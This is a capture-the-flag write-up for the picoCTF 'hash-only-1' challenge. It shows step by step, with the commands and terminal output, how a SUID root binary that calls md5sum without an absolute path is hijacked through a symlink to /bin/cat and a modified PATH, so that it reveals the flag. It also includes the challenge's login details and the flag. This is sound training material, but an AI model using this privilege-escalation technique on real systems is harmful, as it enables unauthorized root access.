# hash-only-1

## Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content! Connect using `ssh ctf-player@shape-facility.picoctf.net -p 56543` with the password, `a15d25e1` and run the binary named "flaghasher". You can get a copy of the binary if you wish: `scp -P 56543 ctf-player@shape-facility.picoctf.net:~/flaghasher`

We start the server by the above command and password

We first with the command `ls -la` as it show the **list files and directories** in the current directory (or a specified path) with **detailed information**, including **hidden files**.

It shows the file *flaghasher* has the `-rwsr-xr-x` where `-rwsr` means read , write and the `s` in place of the **owner's execute bit** means the **SetUID (SUID)** bit is set.

```
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    20 Jul  4 15:54 .
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
drwx------ 2 ctf-player ctf-player    34 Jul  4 15:54 .cache
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher
```

So, when we open the flaghasher file, we can see that it is using MD5 hash in the file /root/flag.txt. And we can have the access only by the root. SUID means allows a user to execute a file with the permissions of the file's owner, rather than their own. 

- You were given a **SUID binary** called `flaghasher` (owned by `root` and with `rws` permissions).
- Running it as a normal user executes it **with root privileges**.
- It internally called a program named `md5sum` â€” _but without giving an absolute path_ (like `/usr/bin/md5sum`).

```
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 

3daf8ce91eaaba82780562d65223e131  /root/flag.txt

```

CONCEPT : SYMLINK and ABSOLUTE LINK 
A symbolic link (symlink) is a file that acts as a pointer to another file or directory, and it can be either absolute or relative. An absolute link uses a full path to the target, while a relative link uses a path relative to the symlink's own location.

Created a fake `md5sum`:
Now we will do the symbolic linking because an absolute path in not defined. where we give the command
```
ln -s /bin/cat md5sum
```

This symlink tricks anything trying to run `md5sum` into executing `cat` instead.
```
ctf-player@pico-chall$ ln -s /bin/cat md5sum
ctf-player@pico-chall$ ls -la
total 24
drwxr-xr-x 1 ctf-player ctf-player    34 Jul  4 15:55 .
drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
drwx------ 2 ctf-player ctf-player    34 Jul  4 15:54 .cache
-rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
-rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher
lrwxrwxrwx 1 ctf-player ctf-player     8 Jul  4 15:55 md5sum -> /bin/cat

```

We will check the current location of the file. The command `echo $PATH` displays the current value of the `PATH` environment variable. 

```
echo $PATH
```

Hijacked the `PATH`:

```
export PATH=".":$PATH
```

The command `export PATH=".:$PATH"` modifies the `PATH` environment variable in a Linux or Unix-like system. Specifically, it adds the current directory (`.`) to the beginning of the `PATH`, making it the first place the shell searches for executable files. This allows you to run scripts or programs located in the current directory by simply typing their name, without needing to specify the full path

This ensures that the system will look in your current directory **first** when trying to resolve `md5sum`.

```
ctf-player@pico-chall$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
ctf-player@pico-chall$ export PATH=".":$PATH
ctf-player@pico-chall$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

Now when we will open the file ./flaghasher it will open the file without the md5sum. 

```
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}
```

#### FLAG - picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_cc661106}


